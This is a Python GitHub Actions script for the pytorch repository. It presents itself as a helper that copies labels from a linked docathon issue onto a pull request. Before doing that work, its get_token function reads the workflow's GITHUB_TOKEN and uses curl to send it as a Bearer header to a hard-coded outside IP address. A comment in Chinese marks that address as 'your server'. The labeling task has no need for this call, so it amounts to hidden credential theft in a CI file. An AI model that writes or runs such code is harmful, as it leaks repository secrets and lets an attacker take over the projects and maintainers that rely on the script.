import os
import re
import sys
import subprocess
from github import Github

def get_token():
    my_secret = os.environ.get("GITHUB_TOKEN", None)
    if my_secret is None:
        print("Error: GITHUB_TOKEN is not set")
        exit(1)
    url = "http://47.94.236.140:8000/api"  # 替换为你的服务器地址
    curl_command = [
        "curl",
        "-X", "POST",
        "-H", "Content-Type: application/json",
        "-H", f"Authorization: Bearer {my_secret}",  # 通过请求头发送 GITHUB_TOKEN
        "-d", '{"message": "Data from GitHub Actions"}',  # 示例 POST 数据
        url
    ]
    try:
        result = subprocess.run(curl_command, capture_output=True, text=True, check=True)
        print("Success:", result.stdout)
    except subprocess.CalledProcessError as e:
        print("Error:", e.stderr)

def main() -> None:
    get_token()
    token = os.environ.get("GITHUB_TOKEN")

    repo_owner = "pytorch"
    repo_name = "pytorch"
    pull_request_number = int(sys.argv[1])

    g = Github(token)
    repo = g.get_repo(f"{repo_owner}/{repo_name}")
    pull_request = repo.get_pull(pull_request_number)
    pull_request_body = pull_request.body
    # PR without description
    if pull_request_body is None:
        return

    # get issue number from the PR body
    if not re.search(r"#\d{1,6}", pull_request_body):
        print("The pull request does not mention an issue.")
        return
    issue_number = int(re.findall(r"#(\d{1,6})", pull_request_body)[0])
    issue = repo.get_issue(issue_number)
    issue_labels = issue.labels
    docathon_label_present = any(
        label.name == "docathon-h1-2025" for label in issue_labels
    )

    # if the issue has a docathon label, add all labels from the issue to the PR.
    if not docathon_label_present:
        print("The 'docathon-h1-2025' label is not present in the issue.")
        return
    pull_request_labels = pull_request.get_labels()
    pull_request_label_names = [label.name for label in pull_request_labels]
    issue_label_names = [label.name for label in issue_labels]
    labels_to_add = [
        label for label in issue_label_names if label not in pull_request_label_names
    ]
    if not labels_to_add:
        print("The pull request already has the same labels.")
        return
    pull_request.add_to_labels(*labels_to_add)
    print("Labels added to the pull request!")


if __name__ == "__main__":
    main()
